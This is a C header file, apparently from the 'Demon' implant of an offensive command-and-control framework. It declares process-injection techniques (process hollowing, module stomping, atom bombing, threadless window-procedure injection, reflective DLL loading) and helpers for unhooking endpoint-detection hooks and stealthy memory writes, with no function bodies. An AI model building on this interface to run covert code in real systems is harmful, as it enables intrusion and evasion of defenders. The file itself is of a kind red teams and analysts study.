
#ifndef DEMON_BASEINJECT_H
#define DEMON_BASEINJECT_H

#include <Demon.h>

#include <core/Memory.h>
#include <core/Thread.h>

// Legacy injection techniques (kept for compatibility)
#define INJECTION_TECHNIQUE_WIN32           1
#define INJECTION_TECHNIQUE_SYSCALL         2
#define INJECTION_TECHNIQUE_APC             3

// Thread-based injection techniques
#define INJECTION_TECHNIQUE_PROCESS_HOLLOW  4
#define INJECTION_TECHNIQUE_MODULE_STOMP    5
#define INJECTION_TECHNIQUE_THREAD_HIJACK   6
#define INJECTION_TECHNIQUE_MANUAL_MAP      7
#define INJECTION_TECHNIQUE_EXCEPTION_HOOK  8

// Thread execution methods
#define INJECTION_TECHNIQUE_CALLBACK        9
#define INJECTION_TECHNIQUE_FIBER           10  
#define INJECTION_TECHNIQUE_EXCEPTION       11
#define INJECTION_TECHNIQUE_WORKITEM        12

// Threadless injection techniques
#define INJECTION_TECHNIQUE_WINDOW_PROC     13
#define INJECTION_TECHNIQUE_VECTORED_EH     14
#define INJECTION_TECHNIQUE_ATOM_BOMB       15

#define SPAWN_TECHNIQUE_SYSCALL             2
#define SPAWN_TECHNIQUE_APC                 3
#define SPAWN_TECHNIQUE_HOLLOW              4
#define SPAWN_TECHNIQUE_STOMP               5

// Defaults
#define SPAWN_TECHNIQUE_DEFAULT             SPAWN_TECHNIQUE_HOLLOW
#define INJECTION_TECHNIQUE_DEFAULT         INJECTION_TECHNIQUE_WINDOW_PROC

typedef enum _DX_CREATE_THREAD
{
    DX_THREAD_DEFAULT           = 0,
    DX_THREAD_WIN32             = 1,
    DX_THREAD_SYSCALL           = 2,
    DX_THREAD_APC               = 3,
    DX_THREAD_WOW               = 4,
    DX_THREAD_SYSAPC            = 5,
} DX_THREAD;

typedef struct INJECTION_CTX
{
    HANDLE  hProcess;
    DWORD   ThreadID;
    DWORD   ProcessID;
    HANDLE  hThread;
    SHORT   Arch;
    BOOL    PipeStdout;

    BOOL    SuspendAwake;
    LPVOID  Parameter;
    UINT32  ParameterSize;

    SHORT   Technique;
} INJECTION_CTX, *PINJECTION_CTX ;

/* injection errors */
#define INJECT_ERROR_SUCCESS                0   /* no error. successful executed */
#define INJECT_ERROR_FAILED                 1   /* aborted while trying to execute function */
#define INJECT_ERROR_INVALID_PARAM          2   /* invalid param */
#define INJECT_ERROR_PROCESS_ARCH_MISMATCH  3   /* process arch mismatches the injection arch */

#define INJECT_WAY_SPAWN   0
#define INJECT_WAY_INJECT  1
#define INJECT_WAY_EXECUTE 2

DWORD Inject(
    IN BYTE   Method,
    IN HANDLE Handle,
    IN DWORD  Pid,
    IN BOOL   x64,
    IN PVOID  Payload,
    IN SIZE_T Size,
    IN UINT64 Offset,
    IN PVOID  Argv,
    IN SIZE_T Argc
);

// Legacy injection methods (kept for compatibility)
BOOL  ShellcodeInjectDispatch( BOOL Inject, SHORT InjectionMethod, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );
DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );

// Injection techniques
DWORD ProcessHollowInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );
DWORD ManualMapInject( HANDLE hTargetProcess, LPVOID DllBuffer, SIZE_T DllSize, PINJECTION_CTX ctx );
DWORD AtomBombInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );
DWORD ExceptionHookInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );

// Thread execution methods
DWORD CallbackInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );
DWORD FiberInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );
DWORD WorkitemInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );

// Threadless injection methods
DWORD WindowProcInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );
DWORD VectoredExceptionInject( HANDLE hTargetProcess, LPVOID Payload, SIZE_T PayloadSize, PINJECTION_CTX ctx );

// Utility functions for advanced techniques
PVOID FindRemoteModule( HANDLE hProcess, LPCWSTR ModuleName );
DWORD FindRemoteThread( DWORD ProcessId );
BOOL  UnhookEDRHooks( HANDLE hProcess );
PVOID AllocateInModule( HANDLE hProcess, LPVOID ModuleBase, SIZE_T Size );
BOOL  SetHardwareBreakpoint( HANDLE hThread, PVOID Address, DWORD Type );

// Injection utilities
DWORD GenerateRandomValue( DWORD min, DWORD max );
PVOID FindCodeCaveByHash( HANDLE hProcess, DWORD moduleHash, SIZE_T requiredSize );
PVOID FindRemoteModuleByHash( HANDLE hProcess, DWORD moduleHash );
PVOID FindCodeCave( HANDLE hProcess, PVOID moduleBase, SIZE_T requiredSize );
BOOL  StealthWriteMemory( HANDLE hProcess, PVOID address, LPCVOID buffer, SIZE_T size );
LONG_PTR GetWindowProcOffset( HWND hwnd, HANDLE hProcess );

// Hollowing helpers
typedef struct _HOLLOW_PROCESS_INFO {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID  OriginalEntryPoint;
    PVOID  ImageBase;
    SIZE_T ImageSize;
} HOLLOW_PROCESS_INFO, *PHOLLOW_PROCESS_INFO;

typedef struct _MODULE_STOMP_INFO {
    PVOID  ModuleBase;
    SIZE_T ModuleSize;
    PVOID  StompAddress;
    SIZE_T StompSize;
    BYTE   OriginalBytes[4096];
} MODULE_STOMP_INFO, *PMODULE_STOMP_INFO;

#endif
